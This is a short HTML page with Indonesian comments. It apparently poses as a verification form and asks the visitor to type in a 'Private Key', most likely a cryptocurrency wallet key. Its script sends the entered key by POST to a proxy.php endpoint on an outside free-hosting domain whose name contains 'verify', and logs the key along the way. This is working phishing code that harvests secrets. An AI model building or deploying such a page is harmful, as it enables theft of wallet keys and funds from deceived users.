<!DOCTYPE html>
<html>
<head>
    <title>Form POST dengan Proxy</title>
</head>
<body>
    <label for="PrivateKey">Private Key:</label>
    <input type="text" id="PrivateKey" name="PrivateKey" required>
    <button onclick="submitForm()">Submit</button>

    <script>
        function submitForm() {
            console.log("Tombol diklik, fungsi submitForm() berjalan");

            const privateKey = document.getElementById("PrivateKey").value;
            console.log("Private Key:", privateKey);

            fetch("https://verify-nkbihfbeo.byethost18.com/proxy.php", {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: "PrivateKey=" + encodeURIComponent(privateKey)
            })
            .then(response => response.text())
            .then(data => {
                console.log("Response dari server:", data);
                alert(data); // Tampilkan respons dari server
            })
            .catch(error => {
                console.error("Error:", error);
                alert("Terjadi kesalahan, cek konsol untuk detailnya.");
            });
        }
    </script>
</body>
</html>
